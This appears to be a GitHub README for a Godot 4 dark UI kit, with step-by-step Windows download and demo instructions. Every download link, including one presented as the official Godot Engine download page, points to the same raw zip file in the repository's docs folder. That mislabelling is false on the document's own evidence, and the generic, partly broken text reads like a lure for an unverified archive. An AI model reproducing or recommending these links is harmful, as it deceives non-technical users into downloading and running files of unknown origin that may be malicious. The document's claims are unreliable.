# ⚙️ godot-shadcn-ui-kit - Dark UI Kit for Godot 4

[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip)

---

godot-shadcn-ui-kit is a dark-themed UI kit created for Godot 4. It includes a set of components you can use to build game interfaces or other apps. The kit comes with runtime GDScript code and an editable demo to help you explore its features.

This guide will walk you through the steps needed to download and run the kit on a Windows PC. No prior coding experience or Godot knowledge is needed.

---

## 📥 How to Download and Install

1. Open your web browser and go to the download page:

   [https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip](https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip)

2. On this page, look for the latest release version. It will be listed near the top.

3. Under the latest release, you will see one or more files available to download. Look for a file ending with `.zip` or `.tscn` (scene file) or `.gd` (GDScript file). The most common file will be a zip archive containing all assets.

4. Click the file name to download it. Your browser will save it to your default Downloads folder.

5. After the download finishes, open the folder where the file was saved.

6. If it is a `.zip` file, right-click it and select "Extract All..." to unzip the contents. Choose a folder easy to find, like your desktop.

7. You now have the kit files ready to open and use.

## 🚀 Running the UI Kit Demo in Godot 4

To view and interact with the demo included in this kit, you will use Godot Engine version 4 or later. If you do not have Godot installed, follow these steps first:

### Installing Godot 4

1. Visit the official Godot Engine download page: https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip

2. Download the standard 64-bit version for Windows, which is a `.zip` file.

3. After downloading, extract the zip file to a folder you choose.

4. Inside the folder, locate and double-click `Godot.exe` to launch the engine. There is no formal installer.

---

### Opening the UI Kit Demo

1. Start Godot Engine.

2. On the project manager screen, click "Import".

3. In the file dialog, navigate to the folder where you extracted the `godot-shadcn-ui-kit` files.

4. Find a file named `project.godot` or the demo scene file with `.tscn` extension.

5. Select the file and click "Open".

6. The kit project will now appear in the project list.

7. Select the project and click "Edit" to open it in Godot.

---

### Using the Demo Scene

1. In Godot’s main editor window, find the "Scene" panel on the left.

2. Open the demo scene file, usually named something like `demo.tscn` or `main.tscn`.

3. Press the Play button at the top right or press `F5` to run the demo.

4. The demo will show a dark-themed user interface, demonstrating how the UI kit components work.

5. You can interact with elements like buttons, toggles, and sliders.

## 🎯 What Is Included in the Kit?

- **Dark UI Components**  
  You get ready-to-use UI components styled with a dark theme, suitable for games or applications.

- **Runtime Scripts**  
  GDScript files run alongside the UI elements, managing behavior and interactivity.

- **Responsive Design**  
  Components will adjust for different screen sizes to work smoothly on various devices.

  A fully working sample project showcasing key features and usage.

## 🛠 How to Customize the UI Kit

You can open and edit the UI components directly in Godot. Here are the main ways to customize:

- **Edit Scenes:** Open `.tscn` files and move, add, or remove UI elements using the Godot editor.

- **Edit Scripts:** Modify `.gd` files to change how components behave.

- **Change Styles:** Adjust theme colors and fonts via Godot’s theme editor or parameters within the scene.

- **Add Components:** Combine kit components with your own UI parts to build new screens.
